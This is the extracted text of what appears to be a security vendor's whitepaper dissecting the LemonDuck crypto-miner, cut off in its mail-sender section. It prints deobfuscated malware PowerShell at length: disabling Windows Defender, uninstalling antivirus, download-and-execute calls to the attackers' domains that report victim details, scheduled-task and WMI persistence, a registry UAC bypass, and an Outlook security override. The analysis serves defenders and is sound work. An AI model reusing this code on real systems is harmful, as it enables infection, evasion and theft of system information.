{
    "id": "d56db31e-ff8e-4ca4-a98e-4a912bcc492c",
    "created_at": "2022-10-25T16:48:23.221865Z",
    "updated_at": "2025-03-27T02:09:29.882275Z",
    "deleted_at": null,
    "sha1_hash": "543db93a2e55f800b9c7044ab657b4748b874351",
    "title": "Macintosh HD:Users:Shared:dd:4work:Bitdefender-PR-Whitepaper-LemonDuck-creat4826-en_EN:Bitdefender-PR-Whitepaper-LemonDuck-creat4826-en_EN.indd",
    "authors": "",
    "file_creation_date": "2020-10-02T13:30:23Z",
    "file_modification_date": "2020-10-02T13:30:28Z",
    "file_size": 5778777,
    "plain_text": "#### Security\n# Dissecting LemonDuck Crypto-Miner, a KingMiner Successor\n\nwww.bitdefender.com\n\n\n-----\n\n## Contents\n\nSummary........................................................................................................................................................3\nTechnical analysis.........................................................................................................................................4\n\nInitial access...............................................................................................................................................................4\nExecution flow.............................................................................................................................................................4\nPersistence............................................................................................................................................................... 10\nSecond Stage. Executing for Profit......................................................................................................................... 10\nPayloads Ran in Memory............................................................................................................................ 18\n\nReport....................................................................................................................................................................... 18\nMail Sender............................................................................................................................................................... 18\nOde.bin...................................................................................................................................................................... 30\nPayloads Downloaded to Disk................................................................................................................... 32\n\nif.bin aka. InFect many other systems.................................................................................................................... 32\nm6.bin aka. XMRig................................................................................................................................................... 46\nm6g.bin aka. XMRig................................................................................................................................................. 46\nkr.bin aka. Kill Competition...................................................................................................................................... 47\nCommand and Control............................................................................................................................... 56\nImpact.......................................................................................................................................................... 58\n\n## Contents\n\nCampaign distribution............................................................................................................................................. 58\nConclusion................................................................................................................................................... 59\nBibliography................................................................................................................................................. 60\nMITRE techniques breakdown................................................................................................................... 61\nAppendix 1. Indicators of Compromise..................................................................................................... 62\n\n\n**Author:**\n\n\n-----\n\nDissecting LemonDuck Crypto-Miner, a KingMiner Successor\n\n\n-----\n\nDissecting LemonDuck Crypto-Miner, a KingMiner Successor\n\n## Technical analysis\n\n### Initial access\n\nThe infection on the system closely depends on the lateral movement capabilities of the malicious scripts. LemonDuck\nexpanded on the original idea of Kingminer to brute-force SQL Server accounts, and added more exploitation\ntechniques to its arsenal. An infection can start on a system in multiple ways:\n\n- phishing e-mail - sent from an already infected machine\n\n- EternalBlue or other SMB exploits\n\n- RDP brute-forcing - if there are weak accounts on the system\n\n- A .lnk file from a removable drive or a network drive\n\n- SSH brute-forcing - if there are weak accounts on the system\n\n- Pass-the-hash - if the attackers manage to dump a valid NTLM password hash\n\n- MS-SQL brute-forcing - similar to Kingminer, if there are weak DB credentials\n\n- Redis remote command\n\n- Yarn remote command\n### Execution flow\n\n**First Stage. Landing on the System**\n\n\n-----\n\nDissecting LemonDuck Crypto-Miner, a KingMiner Successor\n\nThe first step when attackers gain a foothold on the machine is to download and execute a powershell script from the\nC2 server. The URL for each infected machine is unique based on information from the environment variables.\n\nWe deobfuscated the script from the attacker’s server and obtained the following powershell script:\n```\nfunction bpu($payload){\n     $ver=[Environment]::OSVersion.Version.Major\n     $kill_payload=”cmd /c echo Set-MpPreference -DisableRealtimeMonitoring 1;AddMpPreference -ExclusionPath c:\\;Add-MpPreference -ExclusionProcess c:\\windows\\system32\\\nWindowsPowerShell\\v1.0\\powershell.exe|powershell -w hidden”\n     if($payload.startswith(“http”)){\n\n```\n### If it is a first infection (payload is an URL), then generate a custom URL based on\n```\nthe username and computer name and download the next stage from there\n### This way the attackers obtain some information about the infected machine and can\n\n```\ndeliver updated versions of payloads on the fly\n```\n         $payload=”Iex(new-object net.webclient).\ndownloadstring(‘”+$payload+”?$env:username*$env:computername*$ver’)”\n     }\n     if(([int]([Security.Principal.WindowsPrincipal][Security.Principal.\nWindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]\n‘Administrator’))){\n\n```\n### Execute the first part of the payload which disables Windows Defender\n```\n         iex $kill_payload\n         sleep 5\n### Execute the next stage\n         iex $payload\n         return\n     }\n### If this is a recurring infection (payload is a cmd) create default shells (cmd with\n\n```\nmalicious command line) for CompMgmtLauncher.exe or ComputerDefaults.exe\n```\n     if ($ver -eq 10) {\n         $key=”ms-settings”\n         $exp=”ComputerDefaults.exe”\n         $payload=”$kill_payload & powershell -w hidden $payload”\n     } else {\n\n```\n$key=”mscfile”\n\n$exp=”CompMgmtLauncher.exe”\n```\n         $payload=”powershell -w hidden $payload”\n     }\n\n```\n$regPath = “HKCU:\\Software\\Classes\\$key\\shell\\open\\command”\n```\n  New-Item $regPath -Force\n  New-ItemProperty $regPath -Name “DelegateExecute” -Value $null -Force\n     if(!($payload.startswith(“cmd /c”) -or $payload.startswith(“cmd.exe /c”))){\n         $payload=”cmd /c $payload”\n     }\n\n```\n\n-----\n\nDissecting LemonDuck Crypto-Miner, a KingMiner Successor\n```\n     Set-ItemProperty $regPath -Name “(default)” -Value “$payload” -Force\n\n```\n### Launch CompMgmtLauncher.exe or ComputerDefaults.exe, thus executing the malicious\n```\ncommand line registered above. Defense Evasion\n     Start-Process $exp\n  sleep 5\n  Remove-Item $regPath -Force -Recurse\n}\n\n```\nThere are two ways for the same downloader command line to execute on the system. The first is the direct way of\ninvoking the command line. The second contains an extra step in an attempt to go undetected by registering a custom\ncommand line for launching a CompMgmtLauncher.exe or a ComputerDefaults.exe process. They are both legitimate\nWindows processes, and security solutions might not monitor them for malicious activity. This command line is only\nused once when the script is running. After one of the chosen processes starts, the script deletes the registry key\ncontaining the malicious command line to stop interfering with the legitimate execution of the OS.\n\nThe malicious command line that runs the next stage downloads the payload in a similar way to the initial access:\n```\ncmd /c echo Set-MpPreference -DisableRealtimeMonitoring 1;Add-MpPreference\n-ExclusionPath c:\\;Add-MpPreference -ExclusionProcess c:\\windows\\system32\\\nWindowsPowerShell\\v1.0\\powershell.exe|powershell -w hidden Iex(new-object net.\nwebclient).downloadstring(‘http://t.amynx.com/ipc.jsp?0.8?Ion Testalescu*DESKTOPD65O5JE*10’)\n\n```\nThis download URL also reports to the attacker that a new system got infected and it contains the user name and\nmachine name in the parameters. The downloaded script is again obfuscated by scrambling a few characters and\ninverting the whole payload. In its final form it looks like this:\n\n### Uninstall AV with the help of WMI\n```\ncmd /c start /b wmic.exe product where “name like ‘%Eset%’” call uninstall /\nnointeractive\ncmd /c start /b wmic.exe product where “name like ‘%%Kaspersky%%’” call uninstall /\nnointeractive\ncmd /c start /b wmic.exe product where “name like ‘%avast%’” call uninstall /\nnointeractive\ncmd /c start /b wmic.exe product where “name like ‘%avp%’” call uninstall /\nnointeractive\ncmd /c start /b wmic.exe product where “name like ‘%Security%’” call uninstall /\nnointeractive\ncmd /c start /b wmic.exe product where “name like ‘%AntiVirus%’” call uninstall /\nnointeractive\ncmd /c start /b wmic.exe product where “name like ‘%Norton Security%’” call uninstall /\nnointeractive\ncmd /c “C:\\Progra~1\\Malwarebytes\\Anti-Malware\\unins000.exe” /verysilent /\nsuppressmsgboxes /norestart\n$v=”?$v”+(Get-Date -Format ‘_yyyyMMdd’)\n### Persistence script stored in tmps\n$tmps=’function a($u){$d=(Ne`w-Obj`ect Net.WebC`lient).”DownloadData”($u);$c=$d.\n\n```\n\n-----\n\nDissecting LemonDuck Crypto-Miner, a KingMiner Successor\n```\nters;$p.Modulus=[convert]::FromBase64String(‘’2mWo17uXvG1BXpmdgv8v/3NTmnNubHtV62fWrk4jP\n```\nFI9wM3NN2vzTzticIYHlm7K3r2mT/YR0WDciL818pLubLgum30r0Rkwc8ZSAc3nxzR4iqef4hLNeUCnkWqulY5C0M85bjDLCpjblz/2LpUQcv1j1feIY6R7rpfqOLdHa10=’’);$p.Exponent=0x01,0x00,0x01;$r=New-Ob```\nject Security.Cryptography.RSACryptoServiceProvider;$r.ImportParameters($p);if($r.\n\n```\nverifyData($b,(New-Object Security.Cryptography.SHA1CryptoServiceProvider),[convert]::```\nFromBase64String(-join([char[]]$d[0..171])))){I`ex(-join[char[]]$b)}}}$url=’’http://’’\n\n```\n+’’U1’’+’’U2’’;a($url+’’/a.jsp’+$v+’?’’+(@($env:COMPUTERNAME,$env:USERNAME,(get-wmiobject Win32_ComputerSystemProduct).UUID,(random))-join’’*’’))’\n```\n$sa=([Security.Principal.WindowsPrincipal][Security.Principal.\nWindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]\n“Administrator”)\nfunction getRan(){return -join([char[]](48..57+65..90+97..122)|Get-Random -Count\n(6+(Get-Random)%6))}\n### Attacker’s domains\n\n```\n$us=@(‘t.zz3r0.com’,’t.zer9g.com’,’t.amynx.com’)\n```\n$stsrv = New-Object -ComObject Schedule.Service\n$stsrv.Connect()\n### Get a scheduled task named blackball\ntry{\n$doit=$stsrv.GetFolder(“\\”).GetTask(“blackball”)\n}catch{}\n\n```\n### If this task is not present aka. the system was not infected before, then continue\n```\nwith the infection\nif(-not $doit){\n     if($sa){\n\n```\nschtasks /create /ru system /sc MINUTE /mo 120 /tn blackball /F /tr\n```\n“blackball”\n     } else {\n\n```\nschtasks /create /sc MINUTE /mo 120 /tn blackball /F /tr “blackball”\n```\n     }\n     ### Scheduled tasks for each domain\n     foreach($u in $us){\n\n```\n$i = [array]::IndexOf($us,$u)\n```\n         if($i%3 -eq 0){$tnf=’’}\n\n```\n\n-----\n\nDissecting LemonDuck Crypto-Miner, a KingMiner Successor\n```\n         if($i%3 -eq 1){$tnf=getRan}\n         if($i%3 -eq 2){if($sa){$tnf=’MicroSoft\\Windows\\’+(getRan)}\nelse{$tnf=getRan}}\n         $tn = getRan\n         if($sa){\n\n```\nschtasks /create /ru system /sc MINUTE /mo 60 /tn “$tnf\\$tn” /F\n```\n/tr “powershell -w hidden -c PS_CMD”\n         } else {\n\n```\nschtasks /create /sc MINUTE /mo 60 /tn “$tnf\\$tn” /F /tr\n```\n“powershell -w hidden -c PS_CMD”\n         }\n         start-sleep 1\n         $folder=$stsrv.GetFolder(“\\$tnf”)\n         $taskitem=$folder.GetTasks(1)\n         foreach($task in $taskitem){\n\n```\nforeach ($action in $task.Definition.Actions) {\n```\n                  try{\n                       if($action.Arguments.Contains(“PS_CMD”)){\n\n```\n$folder.RegisterTask($task.Name,\n$task.Xml.replace(“PS_CMD”,$tmps.replace(‘U1’,$u.substring(0,5)).replace(‘U2’,$u.\nsubstring(5))), 4, $null, $null, 0, $null)|out-null\n```\n                       }\n                  }catch{}\n              }\n         }\n         start-sleep 1\n         schtasks /run /tn “$tnf\\$tn”\n         start-sleep 5\n     }\n}\n\n```\n\n-----\n\nDissecting LemonDuck Crypto-Miner, a KingMiner Successor\n```\ntry{\n\n```\n$doit1=Get-WMIObject -Class __EventFilter -NameSpace ‘root\\subscription’ -filter\n```\n“Name=’blackball’”\n}catch{}\n### WMI event consumers for each domain\nif(-not $doit1){\n\n```\nSet-WmiInstance -Class __EventFilter -NameSpace “root\\subscription” -Arguments @\n{Name=”blackball”;EventNameSpace=”root\\cimv2”;QueryLanguage=”WQL”;Query=”SELECT\n\n- FROM __InstanceModificationEvent WITHIN 3600 WHERE TargetInstance ISA ‘Win32_\n```\nPerfFormattedData_PerfOS_System’”;} -ErrorAction Stop\n  foreach($u in $us){\n    $theName=getRan\n\n```\n$wmicmd=$tmps.replace(‘U1’,$u.substring(0,5)).replace(‘U2’,$u.substring(5)).\nreplace(‘a.jsp’,’aa.jsp’)\n```\n    Set-WmiInstance -Class __FilterToConsumerBinding -Namespace “root\\\n\n```\nsubscription” -Arguments @{Filter=(Set-WmiInstance -Class __EventFilter -NameSpace\n“root\\subscription” -Arguments @{Name=”f”+$theName;EventNameSpace=”root\\\ncimv2”;QueryLanguage=”WQL”;Query=”SELECT * FROM __InstanceModificationEvent WITHIN\n```\n3600 WHERE TargetInstance ISA ‘Win32_PerfFormattedData_PerfOS_System’”;} -ErrorAction\n\n```\nStop);Consumer=(Set-WmiInstance -Class CommandLineEventConsumer -Namespace “root\\\nsubscription” -Arguments @{Name=”c”+$theName;ExecutablePath=”c:\\windows\\system32\\cmd.\nexe”;CommandLineTemplate=”/c powershell -w hidden -c $wmicmd”})}\n```\n    start-sleep 5\n  }\n### Prepare environment for lateral movement later\n### Deny access on ports 445 and 135 so that others can’t exploit SMB\n\n```\ncmd.exe /c netsh.exe firewall add portopening tcp 65529 SDNSd\n```\n  netsh.exe interface portproxy add v4tov4 listenport=65529 connectaddress=1.1.1.1\nconnectport=53\n\n```\nnetsh advfirewall firewall add rule name=”deny445” dir=in protocol=tcp localport=445\n```\naction=block\n\n```\nnetsh advfirewall firewall add rule name=”deny135” dir=in protocol=tcp localport=135\n```\naction=block\n\n```\nSet-ItemProperty -Path “HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\\n```\nParameters” DisableCompression -Type DWORD -Value 1 ???Force\n}\n\n```\n\n-----\n\nDissecting LemonDuck Crypto-Miner, a KingMiner Successor\n```\n### Delete scheduled tasks from an old version of the same campaign\nschtasks /delete /tn Rtsa2 /F\nschtasks /delete /tn Rtsa1 /F\nschtasks /delete /tn Rtsa /F\n\n```\nThis script prepares the environment for execution of the next stages and final payloads. First, it uninstalls any existing\nAV from the system using WMI. Then, for every available domain in the $us variable, it registers a scheduled task and\na WMI event consumer with the same command (stored in $tmps). The script also marks infected systems with an\nempty scheduled task named blackball and adds its persistence mechanism only if this task is not present.\n\nFinally, the script prepares the environment for lateral movement by adding firewall rules for various ports. An\ninteresting action in this phase is denying access on port 445 and 135 on the infected machines, because LemonDuck\ndoes not want others to exploit SMB vulnerabilities after it arrived on the system.\n\n### Persistence\n\nAs we saw in the previous section, LemonDuck employs two techniques to maintain persistence. Attackers took care\nof redundancy; they have three domains (t.zz3r0.com, t.zer9g.com, t.amynx.com) where they hosted the second stage\nscripts. Therefore, they register three commands with scheduled tasks and the same three commands with WMI event\nconsumers. The commands download and execute the same script, so even if scheduled tasks are cleaned up, the\nevent consumers stay as a backup. Even if one or two domains are taken down, they can keep lights on by using the\nredundant servers. Scheduled tasks and WMI event consumers are popular when it comes to file-less attacks as some\nsecurity solutions might not scan the commands included in these entries.\n\nA command line registered to run periodically looks like the one below. The difference between the persistence\ncommand lines is the domain used to download the next stage.\n```\n“powershell” -w hidden -c function a($u){$d=(Ne`w-Obj`ect Net.WebC`lient).”DownloadData”($u);$c=$d.count;if($c -gt 173){$b=$d[173..$c];$p=New-Object Security.Cryptography.\nRSAParameters;$p.Modulus=[convert]::FromBase64String(‘2mWo17uXvG1BXpmdgv8v/3NTmnNub\n```\nHtV62fWrk4jPFI9wM3NN2vzTzticIYHlm7K3r2mT/YR0WDciL818pLubLgum30r0Rkwc8ZSAc3nxzR4iqef4hLNeUCnkWqulY5C0M85bjDLCpjblz/2LpUQcv1j1feIY6R7rpfqOLdHa10=’);$p.Exponent=0x01,0x00,0x01;$r=New-Object Security.Cryptography.RSACryptoServiceProvider;$r.ImportParameters($p);if($r.verifyData($b,(New-Object Security.Cryptography.SHA1CryptoServiceProvider),[convert]::FromBase64String(-join([char[]]$d[0..171])))){I`ex(-join[char[]]$b)}}}$u\nrl=’http://’+’t.zz3’+’r0.com’;a($url+’/a.jsp?_20200807?’+(@($env:COMPUTERNAME,$env:USERNAME,(get-wmiobject Win32_ComputerSystemProduct).UUID,(random))-join’*’))\n\n### Second Stage. Executing for Profit\n\nThe command lines registered at the persistence step download and run the second stage of the attack. At this\nmoment, the initial Powershell process executing the first stage has already stopped. If we look at Task Manager or\nProcess Explorer, we can no longer trace it back to the initial infection as this stage starts from either a svchost.exe\nprocess (for scheduled tasks) or a scrcons.exe process (for event consumers). The downloaded script is obfuscated in\nthe same manner as the previous ones: junk letters appear randomly as salt, and the whole script is reversed when it\nfirst arrives in memory, then it gets deobfuscated when it starts executing.\n\nWe can see an example of obfuscated script with deobfuscation layers in the final lines below:\n\n\n-----\n\nDissecting LemonDuck Crypto-Miner, a KingMiner Successor\n\n# This first line will become the last when reversed and is responsible to replace junk\n```\ncharacters like “YSg+YSg”\n# We can also observe inverted strings (char and replace)\n\n```\n$4Kpj=” ))93]RaHc[,)301]RaHc[+38]RaHc[+98]RaHc[( ECalper- 29]RaHc[,)311]RaHc[+47]\nRaHc[+09]RaHc[(EcAlPErC- 63]RaHc[,)711]RaHc[+17]RaHc[+511]RaHc[+701]RaHc[( EcAlPErC421]RaHc[,’WXkw’ ECalper- )’\n```\n[...edited out...]\n# The last part of this line reverses the whole script and invokes it\n\n```\n( gET-vArIaBle 4KpJ ).ValUE[ -1.. -(( gET-vArIaBle 4KpJ ).ValUE.LeNgth)]```\nJoiN’’|INVOke-EXPrEssIoN\n\n```\nAfter deobfuscation, the script becomes readable, and it contains three distinct parts. The first part prepares the\nenvironment for execution by stopping already-running payloads and disabling Windows Defender, and it gathers\ninformation about the system, such as computer name, domain, OS version, current user privilege, etc.\n\n# Check for CPU architecture\n```\nif([IntPtr]::Size -eq 8){$is64=$true}\n# payload hashes\n$ifbin=”if.bin”\n$ifmd5=”ce510f7de1c4312aa0d74d0f1804c151”\n$krbin=”kr.bin”\n$krmd5=”614257993fd996b4cea3a0fdffa4feac”\nif($is64){\n  $mbin=”m6.bin”\n  $mmd5=”5b2849ff2e8c335dcc60fd2155b2d4d3”\n  $mgbin=”m6g.bin”\n  $mgmd5=”23d59ed726e13edabcb751da7a5ce310”\n}\n# Stop powershell processes which run the above payloads if there are any\nGet-WmiObject -Class Win32_Process|Where-Object{$_.Name -eq ‘powershell.exe’\n\n```\n-and $_.CommandLine -like ‘*ifmd5*’ -and (($_.CommandLine -like “*$ifbin*” -and\n$_.CommandLine -notlike ‘*’+$ifmd5.substring(0,6)+’*’) -or ($_.CommandLine -like\n“*$krbin*” -and $_.CommandLine -notlike ‘*’+$krmd5.substring(0,6)+’*’))}|foreach{Stop```\nProcess -Force -Id $_.processid}\nfunction gmd5($d){\n\n```\n\n-----\n\nDissecting LemonDuck Crypto-Miner, a KingMiner Successor\n```\n  [Security.Cryptography.MD5]::Create().ComputeHash($d)|foreach{$l+=$_.ToString(‘x2’)}\n  return $l\n}\n\n```\n$lifmd5,$lmmd5,$lmgmd5=””,””,””\n```\ntry{$lifmd5=gmd5 ([IO.File]::ReadAllBytes(“$env:tmp\\$ifbin”))}catch{}\ntry{$lmmd5=gmd5 ([IO.File]::ReadAllBytes(“$env:tmp\\$mbin”))}catch{}\n# Collect information about the environment and store in variables\n$down_url = “http://d.ackng.com”\n$core_url = $url.split(“/”)[0..2]-join”/”\n$permit = ([Security.Principal.WindowsPrincipal][Security.Principal.\nWindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]\n“Administrator”)\n\n```\n$comp_name = $env:COMPUTERNAME\n\n$guid = (get-wmiobject Win32_ComputerSystemProduct).UUID\n\n$mac = (Get-WmiObject Win32_NetworkAdapterConfiguration | where {$_.ipenabled -EQ\n$true}).Macaddress | select-object -first 1\n```\n$osb = (Get-WmiObject -class Win32_OperatingSystem)\n\n```\n$os = $osb.Caption.replace(“Microsoft Windows “,””)+”_”+$osb.Version\n\n$user = $env:USERNAME\n```\n$domain = (Get-WmiObject win32_computersystem).Domain\n$uptime = [timespan]::FromMilliseconds([environment]::TickCount)|foreach{$_.\ntotalseconds}\n$card = (Get-WmiObject Win32_VideoController).name\ngwmi Win32_PhysicalMemory | %{$msum = 0} { $msum += $_.Capacity };$mem=$msum/1Gb\ntry{\n# Collect names of network and removable drives\n$drive = ([system.IO.DriveInfo]::GetDrives() | where {$_.IsReady -and ($_.\nAvailableFreeSpace -gt 1024) -and (($_.DriveType -eq “Removable”) -or ($_.DriveType\n-eq “Network”)) -and (($_.DriveFormat -eq “NTFS”) -or ($_.DriveFormat -eq “FAT32”))} |\nforeach{($_.Name)[0]+”_”+($_.DriveType.tostring())[0]})-join”|”}catch{}\n\n```\n$timestamp = (Get-Date -UFormat “%s”).Substring(0,9)\n```\nt {\n\n```\n\n-----\n\nDissecting LemonDuck Crypto-Miner, a KingMiner Successor\n\n[Reflection.Assembly]::LoadWithPartialName(“System.Web.Extensions”)\n```\n# Collect a javascript stored on localhost\n$obj = (New-Object Web.Script.Serialization.\nJavaScriptSerializer).DeserializeObject((ne`w-obj`ect net.\nwebc`lient).”downloadstring”(‘http://127.0.0.1:43669/1/summary’))\n$mv=$obj.version\n$mip=$obj.connection.ip\n\n```\n$mhr=$obj.hashrate.total-join(‘,’)}catch{}\n```\n# Disable Windows Defender\ntry{\n  Set-MpPreference -DisableRealtimeMonitoring 1\n  Add-MpPreference -ExclusionPath c:\\\n  Add-MpPreference -ExclusionProcess c:\\windows\\system32\\WindowsPowerShell\\v1.0\\\npowershell.exe\n}catch{}\n# Collect information about graphics card\nif(($card -match “GTX|NVIDIA|GEFORCE”)){$isn=1}\nif(($card -match “Radeon|AMD”)){$isa=1}\n$v=$u.split(“?”)[1]\n\n```\n$params=@($v,$comp_name,$guid,$mac)-join”&”\n```\nset-location $env:tmp\n\n```\nThe second part downloads and runs the m6.bin, m6g.bin, kr.bin, if.bin, and nvd.zip binaries from the disk. For this, it\ndefines some helper functions and creates mutexes so the payloads run only once per session.\n```\n# Process starter function\nfunction stp($gra){\n\n```\nStart-Process -FilePath cmd.exe -ArgumentList “/c $gra”\n```\n}\n# Downloader function\n\n```\nfunction gcf($code,$md,$fn){\n```\n  ‘powershell -c “’+$code+’;$ifmd5=’’’+$md+’’’;$ifp=$env:tmp+’’\\’+$fn+’’’;$down_\nurl=’’’+$down url+’’’;function gmd5($con){[System Security Cryptography MD5]::Create()\n\n```\n\n-----\n\nDissecting LemonDuck Crypto-Miner, a KingMiner Successor\n```\nComputeHash($con)|foreach{$s+=$_.ToString(‘’x2’’)};return $s}if(test-path $ifp)\n{$con_=[System.IO.File]::ReadAllBytes($ifp);$md5_=gmd5 $con_;if($md5_-eq$ifmd5)\n{$noup=1}}if(!$noup){$con=(Ne`w-Obj`ect Net.WebC`lient).”downloaddata”($down_\nurl+’’/’+$fn+’?’+$params+’’’);$t=gmd5 $con;if($t-eq$ifmd5){[System.\n\n```\nIO.File]::WriteAllBytes($ifp,$con)}else{$noup=1}}if($noup){$con=$con_;$ifmd5=$md5_}’\n```\n}\n\n```\n# GZip deflate and write to file\n```\nfunction gpa($fnam){\n  ‘for($i=0;$i -lt $con.count-1;$i+=1){if($con[$i] -eq 0x0a){break}};i`ex(-join[ch\nar[]]$con[0..$i]);$bin=(New-Object IO.BinaryReader(New-Object System.IO.Compression.\n\n```\nGzipStream (New-Object System.IO.MemoryStream(,$con[($i+1)..($con.count)])), ([IO.\n```\nCompression.CompressionMode]::Decompress))).ReadBytes(10000000);$bin_=$bin.\n\n```\nClone();$mep=$env:tmp+’’’+”\\$fnam.exe.ori”+’’’;[System.IO.File]::WriteAllBytes($mep,$b\n```\nin_+((1..127)|Get-Random -Count 100));test1 -PEBytes $bin”’+”© /y %tmp%\\$fnam.exe.ori\n%tmp%\\$fnam.bin.exe & %tmp%\\$fnam.bin.exe”\n}\n\n```\nfunction gcode($fl) {\n```\n  ‘try{\n\n```\n$local’+$fl+’=$flase;\n\nNew-Object Threading.Mutex($true,’’Global\\\neLocal’+$fl+’’’,[ref]$local’+$fl+’)\n```\n     }\n     catch{}’\n}\n\n```\n# These following lines run the first component “if.bin”\n```\n$code1=gcode “If”\nI`Ex $code1\nif($localIf){\n  stp ((gcf $code1 $ifmd5 $ifbin)+’I`EX(-join[char[]]$con)”’)\n}\n# These following lines run the second component “m6.bin”\nif($is64){\n  $code2=gcode “Mn”\n\n```\n\n-----\n\nDissecting LemonDuck Crypto-Miner, a KingMiner Successor\n```\n  if($localMn){\n    stp ((gcf $code2 $mmd5 $mbin)+(gpa $mbin))\n  }\n}\n\n```\n# If the system has an Nvidia or AMD graphics card, run the third component “m6g.bin”\n```\nif(($isn -or $isa) -and $is64){\n  $code3=gcode “Mng”\n  I`Ex $code3\n  if($localMng){\n    stp ((gcf $code3 $mgmd5 $mgbin)+(gpa $mgbin))\n  }\n}\n# These following lines run the fourth component “kr.bin”\n$code4=gcode “Kr”\nI`Ex $code4\nif($localKr){\n  stp ((gcf $code4 $krmd5 $krbin)+’I`EX(-join[char[]]$con)”’)\n}\n\n```\nThe third part is a downloader and runner that validates the downloaded payloads with the function SIEX (discussed in\nsection Command and Control) and runs them in-memory.\n```\n# Set DNS to Google’s\n\n```\ntry{(get-wmiobject -class win32_networkadapterconfiguration -filter ipenabled=true).\nSetDNSServerSearchOrder(@(‘8.8.8.8’,’9.9.9.9’))}catch{}\n\n# Save all environment info in one big URL\n\n$params+=”&”+(@($os,[Int]$is64,$user,$domain,$drive,$card,$mem,[Int]$permit,($li\nfmd5[0..5]-join””),($lmmd5[0..5]-join””),$mv,$mip,$mhr,$uptime,$timestamp,”0.1”)```\n-join”&”)\n# Server communication function\nfunction SIEX {\n  Param(\n\n```\n\n-----\n\nDissecting LemonDuck Crypto-Miner, a KingMiner Successor\n```\n  )\n  try{\n    $webclient = Ne`w-Obj`ect Net.WebC`lient\n\n```\n$finalurl = “$url”+”?”+”$params”\n```\n    try{\n\n```\n$webclient.Headers.add(“User-Agent”,”Lemon-Duck-”+$Lemon_Duck.\nreplace(‘\\’,’-’))\n```\n    } catch{}\n\n```\n$res_bytes = $webclient.”DownloadData”($finalurl)\n```\n    if($res_bytes.count -gt 173){\n              # Validate if the reply is valid comparing to the signature\n      $sign_bytes = $res_bytes[0..171];\n      $raw_bytes = $res_bytes[173..$res_bytes.count];\n      $rsaParams = New-Object System.Security.Cryptography.RSAParameters\n\n```\n$rsaParams.Modulus = 0xda,0x65,0xa8,0xd7,0xbb,0x97,0xbc,0x6d,\n0x41,0x5e,0x99,0x9d,0x82,0xff,0x2f,0xff,0x73,0x53,0x9a,0x73,0x6e,0x6c,0x7b,\n0x55,0xeb,0x67,0xd6,0xae,0x4e,0x23,0x3c,0x52,0x3d,0xc0,0xcd,0xcd,0x37,0x6b,0xf3,0x4f,\n0x3b,0x62,0x70,0x86,0x07,0x96,0x6e,0xca,0xde,0xbd,0xa6,0x4f,0xf6,0x11,0xd1,0x60,0xdc,\n0x88,0xbf,0x35,0xf2,0x92,0xee,0x6c,0xb8,0x2e,0x9b,0x7d,0x2b,0xd1,0x19,0x30,0x73,0xc6,\n0x52,0x01,0xcd,0xe7,0xc7,0x34,0x78,0x8a,0xa7,0x9f,0xe2,0x12,0xcd,0x79,0x40,0xa7,\n0x91,0x6a,0xae,0x95,0x8e,0x42,0xd0,0xcf,0x39,0x6e,0x30,0xcb,0x0a,0x98,0xdb,0x97,\n0x3f,0xf6,0x2e,0x95,0x10,0x72,0xfd,0x63,0xd5,0xf7,0x88,0x63,0xa4,0x7b,0xae,0x97,\n0xea,0x38,0xb7,0x47,0x6b,0x5d\n\n$rsaParams.Exponent = 0x01,0x00,0x01\n```\n      $rsa = New-Object -TypeName System.Security.Cryptography.\nRSACryptoServiceProvider;\n      $rsa.ImportParameters($rsaParams)\n      $base64 = -join([char[]]$sign_bytes)\n      $byteArray = [convert]::FromBase64String($base64)\n      $sha1 = New-Object System.Security.Cryptography.SHA1CryptoServiceProvider\n\n```\nif($rsa.verifyData($raw_bytes,$sha1,$byteArray)) {\n```\n                  # Invoke command from server’s response\n        IEX (-join[char[]]$raw_bytes)\n\n```\n\n-----\n\nDissecting LemonDuck Crypto-Miner, a KingMiner Successor\n```\n      }\n    }\n  } catch{}\n}\n\n```\n# Call first script “report.jsp”\n```\nSIEX “$core_url/report.jsp”\ntry{\nif($isn -and $is64){\n  $nd=”nvd.zip”\n  $ndg=”$env:tmp\\nvdg.dat”\n  if(!(test-path $ndg) -or (Get-Item $ndg).length -ne 18475008){\n\n```\n(ne`w-obj`ect Net.WebC`lient).”DownloadFile”($down_url+”/$nd”,”$env:tmp\\$nd”)\n```\n    (New-Object -ComObject Shell.Application).NameSpace($env:tmp).\n\n```\nCopyHere(“$env:tmp\\$nd\\*”,16)\n```\n    Remove-Item $env:tmp\\$nd\n  }\n}\n}catch{}\n\n```\n$hks=”HKEY_LOCAL_MACHINE\\SOFTWARE\\”\n\n$mso=”Microsoft\\Office”\n```\n$wnd=”Wow6432Node\\”\n$crm=”ClickToRun\\REGISTRY\\MACHINE\\Software\\”\n\n```\n$paths=@(“$hks$mso”,”$hks$wnd$mso”,”$hks$mso\\$crm$mso”,”$hks$mso\\$crm$wnd$mso”)\n\n# Configure Outlook and set Object Model Guard to automatically approve sending e-mails\n```\nforeach($path in $paths){\nif(test-path Registry::$path){\nget-childitem Registry::$path -name|where-object{$_ -match “\\d+” -and (Test-Path\nRegistry::$path\\$_\\Outlook)}|foreach{\n  $skey=”Registry::$path\\$_\\Outlook\\Security”\n\n```\n\n-----\n\nDissecting LemonDuck Crypto-Miner, a KingMiner Successor\n```\n    New-Item $skey\n  }\n  Set-ItemProperty $skey ObjectModelGuard 2 -type Dword\n\n```\n$mflag=test-path $skey\n```\n}}}\n# If there is an outlook client available\n\n```\nif($mflag){\n\ntry{$localMail=$flase;New-Object Threading.Mutex($true,’Global\\\nLocalMail’,[ref]$localMail)}catch{}\n```\n  if($localMail){\n    if(!(test-path $env:tmp\\godmali4.txt)){\n              # Invoke the script “if_mail”\n      SIEX “$down_url/if_mail.bin”\n    }\n  }\n}\nif(!(test-path $env:tmp\\kk4kk.log)){\n     # Invoke the script “ode”\n  SIEX “$down_url/ode.bin”\n}\n\n```\nNext, we discuss what the in-memory payloads and the downloaded payloads are capable of.\n\n## Payloads Ran in Memory\n\n### Report\n\nThe first SIEX call submits the collected information to the attacker as parameters in the URL. This command does not\nreceive any reply and its only purpose is to notify the attackers of a successful infection.\n\n### Mail Sender\n\n\n-----\n\nDissecting LemonDuck Crypto-Miner, a KingMiner Successor\n\nPowershell script using techniques similar to the previous ones. After deobfuscation, we obtain the script shown\nbelow. The purpose of this script is to send phishing e-mails to the Outlook contacts of the current user. It generates 